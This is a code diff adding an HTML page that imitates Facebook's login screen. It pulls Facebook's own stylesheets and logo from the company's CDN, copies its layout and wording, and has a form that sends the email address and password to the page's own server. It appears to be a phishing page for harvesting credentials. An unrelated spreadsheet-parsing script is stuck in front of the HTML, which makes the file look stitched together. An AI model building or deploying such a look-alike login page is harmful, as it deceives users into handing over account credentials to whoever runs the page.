@@ -1,0 +1,99 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Login Page</title>
+  <meta name="description" content="Log in to start sharing and connecting.">
+  <link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/y1/l/0,cross/jYbeIWPWa4K.css" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v5/yV/l/0,cross/JmsWBPA6XKv.css" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="/static/scripts.js"></script>
+</head>
+<body>
+  <div class="_li">
+    <div id="globalContainer">
+      <div class="fb_content clearfix" id="content" role="main">
+        <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
+          <div class="_8esk">
+            <div class="_8esl">
+              <div class="_8ice">
+                <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Logo">
+              </div>
+              <h2 class="_8eso">Connect and share with the people in your life.</h2>
+            </div>
+            <div class="_8esn">
+              <div class="_8iep _8icy _9ahz _9ah-">
+                <div class="_6luv _52jv">
+                  <form class="_9vtf" id="login_form" method="post">
+                    <input type="hidden" name="_csrf_token" id="csrf_token">
+                    <div>
+                      <div class="_6lux">
+                        <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" placeholder="Email address or phone number" autofocus="1" aria-label="Email address or phone number">
+                      </div>
+                      <div class="_6lux">
+                        <input type="password" class="inputtext _55r1 _6luy _9npi" name="passw" id="pass" placeholder="Password" aria-label="Password" autocomplete="current-password">
+                      </div>
+                    </div>
+                    <div class="_6ltg">
+                      <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" type="submit" id="login_button">Log in</button>
+                    </div>
+                    <div class="_6ltj">
+                      <a href="#">Forgotten password?</a>
+                    </div>
+                    <div class="_8icz"></div>
+                    <div class="_6ltg">
+                      <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#">Create new account</a>
+                    </div>
+                  </form>
+                </div>
+                <div id="reg_pages_msg" class="_58mk">
+                  <a href="#" class="_8esh">Create a Page</a> for a celebrity, brand or business.
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
